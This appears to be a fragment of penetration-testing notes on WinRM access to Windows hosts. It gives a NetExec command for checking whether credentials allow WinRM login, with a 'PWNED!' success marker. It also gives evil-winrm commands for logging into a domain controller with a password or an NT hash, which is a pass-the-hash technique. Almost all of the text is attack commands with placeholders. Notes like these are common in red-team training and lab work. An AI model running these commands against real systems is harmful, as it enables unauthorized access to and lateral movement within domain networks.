...
5985 (HTTP)
5986  HTTPS
 test if user can winrm
 ```
 nxc winrm ip -u user -p pass
 
 # look for PWNED! If it says pwned that means u can winrm into the box
 ```
...
```
evil-winrm domain account + nt
```
evil-winrm -ip DC01IP -u user@fqdn -p pass
example:

evil-winrm -ip DC01IP -u sflowers@ad.someorg.local -H nthash
```
